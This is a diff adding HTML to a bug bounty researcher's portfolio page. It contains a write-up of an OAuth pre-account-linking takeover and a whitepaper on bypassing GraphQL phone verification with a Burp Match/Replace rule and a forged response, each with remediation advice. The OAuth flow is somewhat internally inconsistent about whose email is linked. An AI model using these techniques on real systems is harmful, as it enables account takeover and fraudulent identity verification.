+            Most applications that support both password-based login and "Sign in with Google" merge accounts by matching the verified email address from the Google ID token against existing accounts. The vulnerability arises when the application links accounts <em>before</em> verifying that the user initiating the link actually controls the Google account — or when it merges without validating the OAuth <code>state</code> parameter (CSRF protection).
+          </p>
+          <p class="wp-p">
+            An attacker who knows a victim's email can trigger the OAuth flow, intercept the <code>code</code> grant at the redirect step, and manipulate the linking request — associating the victim's email with the attacker's session. When the victim later signs in with Google, the application silently upgrades the attacker's session, handing over full account access.
+          </p>
+        </div>
+
+        <div style="margin-bottom:20px">
+          <div class="wp-h2">Attack Flow</div>
+          <ol class="steps">
+            <li><p>Attacker initiates "Link Google Account" flow on the target app. App generates an authorization URL: <code>accounts.google.com/o/oauth2/auth?client_id=…&redirect_uri=…&state=ATTACKER_STATE</code></p></li>
+            <li><p>Attacker captures the OAuth <code>code</code> after Google redirects back (either via their own browser or by crafting a cross-site link). The <code>state</code> parameter is absent or not validated server-side.</p></li>
+            <li><p>Attacker POSTs the <code>code</code> to the app's OAuth callback with the victim's email as the linking target. App exchanges <code>code</code> for an ID token, extracts the email, and links it to the attacker's account record.</p></li>
+            <li><p>Victim visits the app and clicks "Sign in with Google" with their real Google account. App receives a valid ID token with victim's email → finds the pre-linked account (attacker's) → logs victim into attacker's session context.</p></li>
+          </ol>
+        </div>
+
+        <div style="margin-bottom:20px">
+          <div class="wp-h2">Key Requests</div>
+          <div class="http-wrap">
+            <div class="http-label"><span><span class="method get">GET</span> OAuth Authorization (attacker-initiated)</span></div>
+            <div class="http-body"><pre>
+GET /o/oauth2/auth
+  ?client_id=<span class="hl-str">&lt;app_client_id&gt;</span>
+  &redirect_uri=<span class="hl-str">https://target.com/auth/google/callback</span>
+  &response_type=<span class="hl-str">code</span>
+  &scope=<span class="hl-str">email profile</span>
+  &state=<span class="hl-str">MISSING_OR_PREDICTABLE</span>   <span class="hl-comment">← no CSRF protection</span>
+Host: accounts.google.com</pre>
+            </div>
+          </div>
+
+          <div class="http-wrap">
+            <div class="http-label"><span><span class="method post">POST</span> Callback with victim email as link target</span><span class="response-indicator err">exploit</span></div>
+            <div class="http-body"><pre>
+POST /auth/google/callback HTTP/2
+Host: target.com
+Cookie: session=<span class="hl-str">&lt;ATTACKER_SESSION&gt;</span>
+
+<span class="hl-key">code</span>=<span class="hl-str">4/0AfJohXn…</span>&<span class="hl-key">state</span>=<span class="hl-str">ATTACKER_STATE</span>
+
+<span class="hl-comment">// Server exchanges code → Google returns ID token with attacker's email
+// BUT: app does not verify that the email in the token matches an existing
+// account owned by the current session before completing the link.
+//
+// Result: victim's Google identity is now federated to attacker's account.</span>
+
+<span class="hl-comment">// Victim clicks "Sign in with Google" later:
+// Google ID token email = victim@gmail.com
+// App lookup: federated_accounts WHERE google_email = victim@gmail.com
+// → returns attacker's account row → victim is logged into attacker's account</span></pre>
+            </div>
+          </div>
+        </div>
+
+        <div class="box-grid">
+          <div class="box impact">
+            <div class="box-title">Impact</div>
+            <ul>
+              <li>Pre-account linking → victim silently logs into attacker's account</li>
+              <li>Full account takeover: attacker sees victim's history, payment methods, PII</li>
+              <li>No victim interaction required beyond normal Google sign-in</li>
+              <li>Scales to any user whose email the attacker knows</li>
+            </ul>
+          </div>
+          <div class="box patch">
+            <div class="box-title">Remediation</div>
+            <ul>
+              <li>Generate and validate a cryptographically random <code>state</code> parameter on every OAuth request (CSRF token, tied to session)</li>
+              <li>Only allow account linking when the user is already authenticated and the OAuth email matches the authenticated account</li>
+              <li>Never merge a new OAuth identity into an existing account without user confirmation step</li>
+              <li>Invalidate existing sessions after any identity federation change</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</section>
+
+<!-- WHITEPAPER -->
+<section id="research">
+  <div class="section-label">Published Research</div>
+  <h2>Whitepaper</h2>
+  <p class="section-desc">Technical write-up on the GraphQL state injection class — a structural pattern appearing across fintech and DeFi onboarding flows.</p>
+
+  <div class="wp">
+    <div class="wp-head">
+      <div class="wp-meta">
+        <span class="wp-chip pub">RESEARCH · MAY 2026</span>
+        <span class="wp-chip">Responsible Disclosure Pending</span>
+        <span class="wp-chip">GraphQL · Authentication</span>
+      </div>
+      <div class="wp-title">Architectural Analysis of Response Manipulation &amp; Client-Side State Injection in GraphQL-Based Authentication Gateways</div>
+      <div class="wp-byline">Author: <strong>Rishuraj Singh</strong> · rishuraj2666.github.io · Bugcrowd / Intigriti / HackerOne</div>
+    </div>
+    <div class="wp-body">
+
+      <div class="wp-section">
+        <div class="wp-h">1 — Abstract</div>
+        <p class="wp-p">
+          GraphQL has become the default API layer for fintech onboarding and KYC flows. Because GraphQL mutations return structured JSON that client-side state managers (Apollo, Redux) treat as ground truth, a single tampered boolean in an API response can silently bypass the entire verification chain. This paper documents the mechanism, demonstrates a repeatable exploit using Burp Suite's Match/Replace rule, and proposes a cryptographic remediation pattern.
+        </p>
+      </div>
+
+      <div class="wp-section">
+        <div class="wp-h">2 — The Architectural Gap</div>
+        <p class="wp-p">
+          In a well-designed multi-step verification flow, the server issues a signed state token after each successful step. Subsequent steps require that token — the server validates its signature before proceeding. The critical design error documented here: the target platform <em>does not issue a state token</em>. The server returns a boolean (<code>verifyPhone: true</code>), and the client router uses that boolean — and only that boolean — to decide whether to show the next step.
+        </p>
+        <div class="note-info">
+          <strong>Root cause:</strong> Client-side state management (Apollo Client cache) is used as the single source of truth for authentication step completion. There is no server-side record that phone verification actually completed before the next mutation is processed.
+        </div>
+      </div>
+
+      <div class="wp-section">
+        <div class="wp-h">3 — Exploitation</div>
+        <div class="wp-h2">3.1 Normal Error Flow</div>
+        <p class="wp-p">An invalid OTP produces the following server response. Note: GraphQL servers commonly return <code>HTTP 200</code> even for application-level errors — this is what makes response manipulation viable.</p>
+        <div class="http-wrap">
+          <div class="http-label"><span><span class="method post">POST</span> api-sandbox.target.com<span class="hl-path">/graphql</span></span><span class="response-indicator err">200 · error</span></div>
+          <div class="http-body"><pre>
+<span class="hl-comment">// Request</span>
+{ <span class="hl-key">"query"</span>: <span class="hl-str">"mutation { verifyPhone(token: \"999999\") }"</span> }
+
+<span class="hl-comment">// Server response (unmodified)</span>
+{
+  <span class="hl-key">"errors"</span>: [{
+    <span class="hl-key">"message"</span>: <span class="hl-str">"Validation Failed"</span>,
+    <span class="hl-key">"path"</span>:    [<span class="hl-str">"verifyPhone"</span>],
+    <span class="hl-key">"code"</span>:    <span class="hl-num">400</span>,
+    <span class="hl-key">"errors"</span>: { <span class="hl-key">"token"</span>: [{ <span class="hl-key">"code"</span>: <span class="hl-str">"invalid"</span> }] }
+  }],
+  <span class="hl-key">"data"</span>: <span class="hl-val-f">null</span>
+}</pre>
+          </div>
+        </div>
+
+        <div class="wp-h2">3.2 Burp Match/Replace Rule</div>
+        <p class="wp-p">Configure a response rule in Burp Suite Proxy → Options → Match and Replace. Scope: <code>api-sandbox.target.com</code>. Type: Response body. The rule fires on every response from the GraphQL endpoint:</p>
+        <div class="http-wrap">
+          <div class="http-label"><span>BURP SUITE · Match &amp; Replace</span></div>
+          <div class="http-body"><pre>
+<span class="hl-comment">// MATCH (regex, response body):</span>
+\{.*?"errors".*?"data":\s*null\s*\}
+
+<span class="hl-comment">// REPLACE WITH:</span>
+{"data":{"verifyPhone":<span class="hl-val-t">true</span>}}</pre>
+          </div>
+        </div>
+
+        <div class="wp-h2">3.3 Forged Response → Frontend State Transition</div>
+        <div class="http-wrap">
+          <div class="http-label"><span>TAMPERED RESPONSE (browser receives)</span><span class="response-indicator mod">manipulated</span></div>
+          <div class="http-body"><pre>
+HTTP/2 200 OK
+Content-Type: application/json
+
+{
+  <span class="hl-key">"data"</span>: {
+    <span class="hl-key">"verifyPhone"</span>: <span class="hl-val-t">true</span>
+  }
+}
+
+<span class="hl-comment">// Apollo Client cache write:
+//   ROOT_QUERY.verifyPhone → true
+// React Router guard: if (cache.verifyPhone) { navigate('/onboarding/id-upload') }
+// Result: phone verification step marked complete. No valid OTP used. No server record.</span></pre>
+          </div>
+        </div>
+      </div>
+
+      <div class="wp-section">
+        <div class="wp-h">4 — Impact Chain</div>
+        <p class="wp-p">
+          The severity depends on whether the backend enforces verification state before processing the final KYC mutation. In the tested instance, the identity upload step and initial account funding were accessible post-bypass — the backend did not cross-check that <code>verifyPhone</code> had genuinely completed. This allows:
+        </p>
+        <div class="finding-note">
+          <strong>P1-Class Risk:</strong> Attacker accounts reach KYC identity submission without owning the phone number. In platforms where the phone number doubles as a 2FA factor or withdrawal confirmation, bypassing verification weakens the entire downstream security chain.
+        </div>
+        <ul class="steps" style="margin-top:0">
+          <li><p>Fraudulent KYC submission: arbitrary phone number can be "verified" and tied to a real identity document.</p></li>
+          <li><p>Attack surface expansion: bypassing phone verification reveals deeper application layers, increasing exploit surface.</p></li>
+          <li><p>Frontend/backend state desync: when both are in inconsistent states, error traces and stack dumps may leak internal paths.</p></li>
+        </ul>
+      </div>
+
+      <div class="wp-section">
+        <div class="wp-h">5 — Remediation</div>
+        <p class="wp-p">The fix requires moving verification state off the client and onto the server with a cryptographic token. Every subsequent step must validate this token server-side — no token, no access.</p>
+        <div class="http-wrap">
+          <div class="http-label"><span>SECURE SCHEMA DESIGN</span><span>GraphQL</span></div>
+          <div class="http-body"><pre>
+type VerifyPhonePayload {
+  success:              Boolean!
+  stateVerificationToken: String!
+  <span class="hl-comment"># Short-lived HMAC token: HMAC-SHA256(userID + step + timestamp, server_secret)
+  # Expires: 15 minutes
+  # Bound to: userID + step ("phone_verified")</span>
+}
+
+<span class="hl-comment"># Every downstream mutation REQUIRES the token:</span>
+mutation SubmitKYC(
+  $identityDoc:           Upload!
+  $stateVerificationToken: String!   <span class="hl-comment"># ← mandatory, verified server-side</span>
+) { ... }
+
+<span class="hl-comment"># Server validation (pseudocode):
+# if not verify_hmac(token, user_id, "phone_verified", secret):
+#     raise AuthorizationError("Phone verification not confirmed")</span></pre>
+          </div>
+        </div>
+        <div class="note-patch">
+          <strong>Additional hardening:</strong> Return <code>HTTP 422 Unprocessable Entity</code> (or <code>401</code>) for validation failures instead of <code>HTTP 200</code> with an error body. This prevents response manipulation from being trivially masked by the status code.
+        </div>
+      </div>
+
+    </div>
+  </div>
+</section>
+
+<!-- LHE -->
+<section id="lhe">
+  <div class="section-label">Live Hacking Events</div>
+  <h2>HackerOne LHE Results</h2>
+  <p class="section-desc">LHEs are invite-only competitive events — an invitation requires earning trust through prior validated findings. 10–12 total invitations across multiple events; three notable placements below.</p>
+  <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:14px;max-width:780px">
+    <div class="platform-card" style="border-color:var(--r-border);text-align:center">
+      <div style="font-size:2.4rem;font-weight:800;color:var(--red);letter-spacing:-.04em;line-height:1">#3</div>
+      <div style="font-size:.72em;font-family:var(--mono);color:var(--fg2);margin:6px 0 14px;letter-spacing:.06em;text-transform:uppercase">LHE Patna</div>
+      <div class="platform-stats">
+        <div class="pstat"><span class="pstat-l">Platform</span><span class="pstat-v">HackerOne</span></div>
+        <div class="pstat"><span class="pstat-l">Handle</span><span class="pstat-v" style="color:var(--accent)">rishusec</span></div>
+        <div class="pstat"><span class="pstat-l">Result</span><span class="pstat-v good">Top 3</span></div>
+      </div>
+    </div>
+    <div class="platform-card" style="border-color:var(--r-border);text-align:center">
+      <div style="font-size:2.4rem;font-weight:800;color:var(--red);letter-spacing:-.04em;line-height:1">#3</div>
+      <div style="font-size:.72em;font-family:var(--mono);color:var(--fg2);margin:6px 0 14px;letter-spacing:.06em;text-transform:uppercase">LHE Patna II</div>
+      <div class="platform-stats">
+        <div class="pstat"><span class="pstat-l">Platform</span><span class="pstat-v">HackerOne</span></div>
+        <div class="pstat"><span class="pstat-l">Handle</span><span class="pstat-v" style="color:var(--accent)">rishusec</span></div>
+        <div class="pstat"><span class="pstat-l">Result</span><span class="pstat-v good">Top 3 again</span></div>
+      </div>
+    </div>
+    <div class="platform-card" style="border-color:var(--a-border);text-align:center">
+      <div style="font-size:2.4rem;font-weight:800;color:var(--accent);letter-spacing:-.04em;line-height:1">#7</div>
+      <div style="font-size:.72em;font-family:var(--mono);color:var(--fg2);margin:6px 0 14px;letter-spacing:.06em;text-transform:uppercase">LHE Bengaluru</div>
+      <div class="platform-stats">
+        <div class="pstat"><span class="pstat-l">Platform</span><span class="pstat-v">HackerOne</span></div>
+        <div class="pstat"><span class="pstat-l">Handle</span><span class="pstat-v" style="color:var(--accent)">rishusec</span></div>
+        <div class="pstat"><span class="pstat-l">Scope</span><span class="pstat-v hot">National Event</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- PLATFORMS -->
+<section id="platforms" style="padding-bottom:0">
+  <div class="section-label">Platforms</div>
+  <h2>Bug Bounty Presence</h2>
+  <p class="section-desc">Active researcher on structured programs across three major crowdsourced security platforms.</p>
+  <div class="platform-grid">
+    <div class="platform-card">
+      <div class="platform-name">HackerOne</div>
+      <div class="platform-handle">rishusec</div>
+      <div class="platform-stats">
+        <div class="pstat"><span class="pstat-l">LHE Patna</span><span class="pstat-v good">#3 × 2</span></div>
+        <div class="pstat"><span class="pstat-l">LHE Bengaluru</span><span class="pstat-v good">#7</span></div>
+        <div class="pstat"><span class="pstat-l">Total Invitations</span><span class="pstat-v hot">10–12 Events</span></div>
+      </div>
+    </div>
+    <div class="platform-card">
+      <div class="platform-name">Bugcrowd</div>
+      <div class="platform-handle">Rishuraj2666</div>
+      <div class="platform-stats">
+        <div class="pstat"><span class="pstat-l">Signal / Accuracy</span><span class="pstat-v good">90%</span></div>
+        <div class="pstat"><span class="pstat-l">Programs</span><span class="pstat-v">Enterprise Perimeters</span></div>
+        <div class="pstat"><span class="pstat-l">Status</span><span class="pstat-v good">Verified</span></div>
+      </div>
+    </div>
+    <div class="platform-card">
+      <div class="platform-name">Intigriti</div>
+      <div class="platform-handle">Active since April 2025</div>
+      <div class="platform-stats">
+        <div class="pstat"><span class="pstat-l">Status</span><span class="pstat-v good">Verified (High-Impact)</span></div>
+        <div class="pstat"><span class="pstat-l">Focus</span><span class="pstat-v">Auth / Logic Flaws</span></div>
+        <div class="pstat"><span class="pstat-l">Disclosure</span><span class="pstat-v">Responsible</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <span class="footer-l">© 2026 Rishuraj Singh · rishuraj2666.github.io</span>
+  <div class="footer-links">
+    <a href="mailto:rishuraj2666@gmail.com">Email</a>
+    <a href="https://rishuraj2666.github.io" target="_blank">Website</a>
+  </div>
+</footer>
+
+<script>
+function toggleFinding(el){
+  el.classList.toggle('open');
+}
+function toggleTheme(){
+  const r=document.documentElement;
+  const t=r.getAttribute('data-theme');
+  if(!t){
+    const dark=window.matchMedia('(prefers-color-scheme:dark)').matches;
+    r.setAttribute('data-theme',dark?'light':'dark');
+  } else {
+    r.setAttribute('data-theme',t==='dark'?'light':'dark');
+  }
+  try{localStorage.setItem('portfolio-theme',r.getAttribute('data-theme'))}catch(e){}
+}
+try{
+  const saved=localStorage.getItem('portfolio-theme');
+  if(saved)document.documentElement.setAttribute('data-theme',saved);
+}catch(e){}
+</script>
